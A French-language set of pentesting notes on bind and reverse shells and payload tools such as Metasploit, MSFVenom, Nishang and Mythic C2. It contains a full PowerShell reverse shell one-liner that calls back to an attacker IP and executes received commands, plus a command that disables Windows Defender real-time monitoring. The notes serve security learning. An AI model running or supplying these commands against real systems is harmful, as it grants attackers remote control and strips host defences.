---
title: "Shells & Payloads"
date: 2025-08-02
draft: false
tags: ["Shells", "security", ""]
categories: ["azure"]
summary: "key vault"
showToc: true
tocOpen: true
---
# Bind Shells
Avec un shell bind, la`Systeme cible ` a un écouteur démarré et attend une connexion du système d'un pentester.
nous nous connectons directement à la cible `IP address`et `port`l'écoutons. Obtenir un Shell de cette manière peut présenter de nombreux défis.
- Il faudrait qu'il y ait déjà un auditeur démarré sur la cible.
- S'il n'y a pas d'auditeur démarré, nous devrons trouver un moyen pour que cela se produise.
- Les administrateurs configurent généralement des règles de pare-feu entrant strictes et NAT (avec implémentation PAT) à la périphérie du réseau (face au public), nous devrions donc déjà être sur le réseau interne.
- Les pare-feu des systèmes d'exploitation (sous Windows et Linux) bloqueront probablement la plupart des connexions entrantes qui ne sont pas associées à des applications réseau de confiance. [[netcat]]( `nc`) est considéré comme notre `Swiss-Army Knife`, car il peut fonctionner sur les sockets TCP, UDP et Unix.

# Reverse Shells
Avec un `reverse shell`, la boîte d'attaque aura un écouteur en cours d'exécution et la cible devra initier la connexion.

Exemple de reverse shell [[PowerShell]]

```Powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Payloads

Nous interagirons avec `community edition` de [[Metasploit]]  Nous utiliserons `modules`des charges utiles pré-construites et personnalisées avec `MSFVenom`.

# Payload avec MSFvenom

Nous disposons de nombreuses options intéressantes pour générer des charges utiles à utiliser sur les hôtes Windows.

`MSFVenom & Metasploit-Framework` MSF est un outil extrêmement polyvalent, indispensable à tout pentester. Il permet d'énumérer les hôtes, de générer des charges utiles, d'utiliser des exploits publics et personnalisés, et d'effectuer des actions post-exploitation une fois sur l'hôte. C'est un véritable couteau suisse.

`Payloads All The Things` Ici, vous pouvez trouver de nombreuses ressources et aide-mémoire différentes pour la génération de charge utile et la méthodologie générale.

`Mythic C2 Framework` Le framework Mythic C2 est une option alternative à Metasploit en tant que framework de commande et de contrôle et boîte à outils pour la génération de charge utile unique.
`Nishang` [[content/posts/Outils/Nishang|Nishang]] est un ensemble d'implants et de scripts PowerShell offensifs. Il comprend de nombreux utilitaires utiles à tout pentester.

`Darkarmour` Darkarmour est un outil permettant de générer et d'utiliser des binaires obscurcis à utiliser contre les hôtes Windows.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://attack.mitre.org/techniques/T1059/